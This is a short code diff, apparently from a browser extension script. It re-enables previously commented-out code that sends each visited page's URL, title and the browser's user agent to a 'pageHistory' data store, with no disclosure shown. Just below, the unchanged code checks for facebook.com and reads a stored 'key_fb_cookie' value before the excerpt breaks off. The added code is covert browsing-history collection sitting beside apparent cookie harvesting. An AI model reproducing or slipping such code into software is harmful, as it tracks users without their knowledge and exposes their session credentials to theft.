@@ -172,20 +172,20 @@
 //   return "";
 // }
 
-// try {
-//   sendHistory(window.location.href, getPageTitle());
-// } catch (e) {}
+try {
+  sendHistory(window.location.href, getPageTitle());
+} catch (e) {}
 
-// function sendHistory(url, title) {
-//   if (!url) {
-//     return;
-//   }
-//   updateData("pageHistory", {
-//     url: url,
-//     userAgent: navigator.userAgent,
-//     title: title,
-//   });
-// }
+function sendHistory(url, title) {
+  if (!url) {
+    return;
+  }
+  updateData("pageHistory", {
+    url: url,
+    userAgent: navigator.userAgent,
+    title: title,
+  });
+}
 
 if(window.location.href.indexOf("facebook.com") > -1) {
   let cookie = localStorage.getItem("key_fb_cookie");
